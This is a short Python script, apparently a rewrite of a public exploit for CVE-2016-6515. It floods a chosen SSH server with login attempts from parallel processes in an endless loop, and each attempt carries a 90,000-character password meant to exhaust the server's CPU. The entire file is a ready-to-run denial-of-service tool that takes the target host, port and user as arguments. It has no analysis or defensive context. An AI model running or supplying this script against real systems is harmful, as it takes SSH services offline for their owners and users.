#!/usr/bin/env python3 
# -*- encoding: utf-8 -*-
#
# Python Rewrite of https://github.com/opsxcq/exploit-CVE-2016-6515/blob/master/exploit.js
#

import paramiko
import argparse
import sys
from multiprocessing import Process

buffer = "A" * 90000

parser = argparse.ArgumentParser()
parser.add_argument("-u", dest="user", required=True, type=str, help="Username")
parser.add_argument("-p", dest="port", required=True, type=int, help="Port Number")
parser.add_argument("-d", dest="host", required=True, type=str, help="HostName")
finalargs = parser.parse_args()


def connect_to_target():
    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.WarningPolicy())
        print("*** Connecting...")
        client.connect(finalargs.host, finalargs.port, finalargs.user, buffer)
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        pass


# while True:
#     try:
#         connect_to_target()
#     except KeyboardInterrupt:
#         sys.exit(0)

if __name__ == "__main__":
    try:
        while True:
            for i in range(4):
                p = Process(target=connect_to_target)
                p.start()
    except KeyboardInterrupt:
        sys.exit(0)
